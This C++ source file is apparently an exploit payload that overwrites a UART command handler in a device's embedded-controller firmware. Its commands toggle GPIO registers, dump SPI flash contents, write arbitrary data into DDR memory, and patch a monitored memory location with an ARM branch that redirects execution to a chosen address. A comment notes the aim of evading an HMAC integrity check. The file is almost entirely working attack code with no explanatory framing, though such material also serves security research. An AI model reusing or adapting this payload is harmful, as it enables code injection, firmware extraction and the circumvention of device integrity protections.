#include <array>
#include <atomic>
#include <cstddef>
#include <cstdint>
#include <cstring>

using u8 = uint8_t;
using u16 = uint16_t;
using u32 = uint32_t;
using vu32 = volatile uint32_t;

enum StatusCode : u32 {
  kSuccess = 0,
  kRxInputTooLong = 0xE0000002,
  kRxInvalidChar = 0xE0000003,
  kRxInvalidCsum = 0xE0000004,
  kUcmdEINVAL = 0xF0000001,
  kUcmdUnknownCmd = 0xF0000006,
  // SyntheticError (our own codes)
  kEmcInReset = 0xdead0000,
  kFwConstsVersionFailed,
  kFwConstsVersionUnknown,
  kFwConstsInvalid,
  kSetPayloadTooLarge,
  kSetPayloadPuareq1Failed,
  kSetPayloadPuareq2Failed,
  kExploitVersionUnexpected,
  kExploitFailedEmcReset,
  kSpiInitFailed,
};

extern "C" {
void ucmd_send_status(u32 uart_index, u32 status, int no_newline);  // 12C044 T
int parse_u32(const char* a1, u32* val);                            // 14CB3A T
int ucmd_printf(u32 uart_index, const char* fmt, ...);
int titania_spi_init(void);
int sflash_read_imm(u32 src, u8 *dst, u32 len);
int msleep(int amount);
}

enum {
  kToggle,
  kToggleFast,
  kTitaniaSpiInit,
  kSflashDump,
  kDdrUpload,
  kDdrWriteHook,
};

static inline void delay(size_t delay) {
  // don't want to use volatile counter (generates loads/stores)
  // just want compiler to not optimize the loop out completely
  while (delay--) {
    std::atomic_signal_fence(std::memory_order_relaxed);
  }
}

struct ParsedArgs {
  ParsedArgs(const char* cmdline, u8* offsets) {
    for (count = 0; count < args.size(); count++) {
      const auto offset = offsets[count];
      if (!offset) {
        break;
      }
      if (parse_u32(&cmdline[offset], &args[count])) {
        break;
      }
    }
  }
  bool has_at_least(size_t wanted) const { return count >= wanted; }

  size_t count{};
  std::array<u32, 8> args{};
};

// NOTE: gpio a16 and a29 are both in gpio2 register bank (5F032000)
// 5F032420 is the data reg.
// a16 = 0x80
// a29 = 0x100000
static void toggle(u32 addr, u32 val, u32 set, u32 delay_amount) {
  auto ptr = (vu32*)addr;
  // TODO mask irq around?
  u32 tmp = *ptr;
  if (set) {
    *ptr = tmp | val;
    delay(delay_amount);
    *ptr = tmp;
  } else {
    *ptr = tmp & ~val;
    delay(delay_amount);
    *ptr = tmp;
  }
}

static void toggle_fast(u32 addr, u32 val) {
  auto ptr = (vu32*)addr;
  u32 tmp = *ptr;
  *ptr = tmp & ~val;
  *ptr = tmp;
}

static void sflash_dump(u32 uart_index, u32 addr, u32 count) {
    for (u32 i = 0; i < count; i++) {
        u8 buf[0x7c]{};
        sflash_read_imm(addr, buf, sizeof(buf));

        char str[sizeof(buf) * 2 + 1]{};
        const char lut[] = "0123456789ABCDEF";
        char *s = str;
        for (size_t j = 0; j < sizeof(buf); j++) {
            u8 b = buf[j];
            *s++ = lut[b >> 4];
            *s++ = lut[b & 0xf];
        }
        ucmd_printf(uart_index, "%s\n", str);

        addr += sizeof(buf);
    }
}

static void ddr_write_18(u32 offset, void *data) {
    void *dst = (void*)(0x60000000ul + offset);
    memcpy(dst, data, sizeof(u32) * 6);
}

static void ddr_write_hook(u32 uart_index, u32 offset, u32 match, u32 target) {
    vu32 *p_val = (vu32*)(0x60000000ul + 0x20000000ul + offset);
    u32 cur_val = 0;
    u32 timeout = 1000;
    while (cur_val != match) {
        u32 val = *p_val;
        if (val == cur_val) {
            if (!timeout--) {
                timeout = 1000;
                msleep(1);
            }
            continue;
        }
        cur_val = val;
        ucmd_printf(uart_index, "%x\n", cur_val);
    }
    // TODO need to avoid getting caught by SELF hmac
    p_val[0] = 0xe51ff004; // ldr pc, [pc, #-4]
    p_val[1] = 0x40000000 | target | 1; // phys addr, thumb
}

// overwrite some existing handler with this
extern "C" void ucmd_handler(u32 uart_index, const char* cmdline, u8* offsets) {
  ParsedArgs parsed(cmdline, offsets);
  u32 status = kUcmdEINVAL;

  if (!parsed.has_at_least(1)) {
    ucmd_send_status(uart_index, status, 0);
    return;
  }

  switch (parsed.args[0]) {
  case kToggle:
    if (!parsed.has_at_least(1 + 4)) {
      break;
    }
    toggle(parsed.args[1], parsed.args[2], parsed.args[3], parsed.args[4]);
    status = kSuccess;
    break;
  case kToggleFast:
    if (!parsed.has_at_least(1 + 2)) {
      break;
    }
    toggle_fast(parsed.args[1], parsed.args[2]);
    status = kSuccess;
    break;
  case kTitaniaSpiInit:
    status = (titania_spi_init() == 0) ? kSuccess : kSpiInitFailed;
    break;
  case kSflashDump:
    if (!parsed.has_at_least(1 + 2)) {
        break;
    }
    sflash_dump(uart_index, parsed.args[1], parsed.args[2]);
    status = kSuccess;
    break;
  case kDdrUpload:
    if (!parsed.has_at_least(1 + 6)) {
        break;
    }
    ddr_write_18(parsed.args[1], &parsed.args[2]);
    status = kSuccess;
    break;
  case kDdrWriteHook:
    if (!parsed.has_at_least(1 + 3)) {
        break;
    }
    ddr_write_hook(uart_index, parsed.args[1], parsed.args[2], parsed.args[3]);
    status = kSuccess;
    break;
  }
  ucmd_send_status(uart_index, status, 0);
}
